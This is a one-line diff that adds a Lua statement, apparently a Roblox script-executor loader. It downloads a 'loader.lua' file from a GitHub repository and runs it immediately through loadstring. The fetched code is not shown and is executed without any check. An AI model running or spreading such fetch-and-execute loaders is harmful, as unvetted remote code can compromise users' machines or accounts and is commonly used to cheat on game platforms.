@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/VestraTech/Vestra/main/Roblox/loader.lua"))()
